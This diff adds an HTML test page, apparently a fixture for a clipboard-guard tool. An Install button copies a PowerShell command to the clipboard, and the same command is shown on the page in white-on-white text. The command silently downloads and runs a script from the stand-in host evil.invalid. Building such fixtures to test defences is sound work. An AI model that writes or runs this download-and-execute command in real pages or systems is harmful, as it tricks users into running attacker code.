@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><title>Text colour equals background</title>
+<script src="common.js"></script>
+<style>
+.cover { position:absolute; left:0; top:0; width:400px; height:60px; background:#fff; z-index:9; }
+</style></head>
+<body><h1>Text colour equals background</h1>
+<p>Click Install. The command is rendered on screen but cannot be read.</p>
+<button id="go">Install</button>
+<div style="background:#ffffff"><pre id="cmd" style="color:#ffffff">powershell -w hidden -c "iwr https://evil.invalid/f2 | iex"</pre></div>
+<script>
+const CMD = 'powershell -w hidden -c "iwr https://evil.invalid/f2 | iex"';
+document.getElementById("go").addEventListener("click", () => window.__clipguard.writeText(CMD));
+</script>
+</body></html>
